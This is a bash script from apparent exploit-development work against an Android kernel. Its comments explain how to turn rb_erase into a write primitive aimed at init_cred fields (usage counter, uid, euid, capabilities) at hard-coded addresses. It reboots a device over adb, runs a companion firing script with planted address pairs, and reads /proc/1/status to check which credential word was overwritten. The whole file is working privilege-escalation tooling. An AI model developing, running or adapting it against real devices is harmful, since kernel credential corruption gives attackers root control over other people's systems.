#!/usr/bin/env bash
# Probe which init_cred word rb_erase's `*(write_value + 4) = write_target`
# store really hits, retrying until a fire actually completes.
#
# Semantics established from rb_erase (c0f9af3c) on this build:
#   plant[0] = write_value -> used as the erased node's parent, so the walk
#             stores write_target at (write_value & ~3) + 4
#   plant[1] = write_target -> the address that receives write_value
# Both stores happen; the parent store is first.
#
# Candidates (init_cred = 0xc1a174d0): usage cell = +0xa0 (read by
# get_task_cred's atomic_inc_not_zero and printed by /proc/1/status as SigQ),
# uid cell = +0xa8, sgid/euid cell = +0xac, cap_inheritable low = +0xb0.
# Aiming write_value at each of those in turn and reading SigQ / Uid / Gid back
# tells us, in one completed fire, both whether the store lands and which cell is
# which -- none of it is observable from a crashed boot, hence the retry loop.
export MSYS_NO_PATHCONV=1
ADB=/c/platform-tools/adb.exe
cd "$(dirname "$0")" || exit 1

booted() { [ "$($ADB shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" = "1" ]; }

wait_boot() {
  local n=0
  $ADB wait-for-device >/dev/null 2>&1
  while ! booted; do sleep 3; n=$((n+3)); [ $n -ge 180 ] && return 1; done
  sleep 6
  return 0
}

PLIST='c1a118dc=c1a17430,c1a118e0=c1a17434,c1a118dc=c1a17438,@c1a118dc=c1a17430'

for r in 1 2 3 4 5 6; do
  echo "=== round $r ==="
  $ADB reboot >/dev/null 2>&1
  sleep 40
  wait_boot || { echo "boot timeout"; continue; }
  bash atd_fire.sh "cl$r" GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_WS_TARGET=st \
    GHOSTLOCK_WBASE=4 GHOSTLOCK_ATTEMPTS=5 GHOSTLOCK_STAT_PLIST="$PLIST" \
    >/dev/null 2>&1
  n=$(grep -acE "WS-DONE" "captures/cl$r.log" 2>/dev/null)
  echo "round $r: WS-DONE lines=$n"
  if [ "${n:-0}" -ge 3 ]; then
    grep -aE "STAT-CRED|STAT-ROOT" "captures/cl$r.log" | tail -3
    echo "--- oracle after this fire ---"
    $ADB shell "sed -n '9,11p;30,33p' /proc/1/status" 2>/dev/null | tr -d '\r'
    echo "RESULT round $r completed"
    exit 0
  fi
done
echo "RESULT: no fire completed in 6 rounds"
exit 1
